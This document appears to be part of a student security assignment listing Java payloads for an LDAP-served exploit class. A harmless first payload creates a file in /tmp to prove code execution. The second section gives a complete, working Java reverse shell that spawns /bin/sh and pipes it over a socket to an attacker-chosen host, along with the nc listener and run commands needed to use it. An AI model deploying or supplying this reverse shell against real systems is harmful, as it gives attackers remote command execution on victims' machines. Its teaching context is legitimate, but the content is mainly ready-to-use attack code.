== Example Exploit Payloads

=== This assignment

For this assignment I am using a very simple payload that just creates a file to show that the exploit has taken place.

--------------------------

import java.io.*;
import java.net.*;

public class Exploit {

    public Exploit() throws Exception {
        try {
            File myObj = new File("/tmp/filename.txt");
            myObj.createNewFile();
        } catch (IOException e) {}
    }
}

--------------------------


=== Reverse shell

This is the example payload that is used for this exploit. Using some Java programming you can open up a reverse shell with ease. To do this yourself you need to change the exploit served by the LDAP server and you need to open up a nc listener.

`nc -lvnp 9001`

`./run.sh reverse_exploit.java`

--------------------------
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh";

        // Spawn a shell
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();

        // Create a websocket
        Socket s=new Socket(host,port);

        // Do some stream redirection between the shell and websocket
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}

--------------------------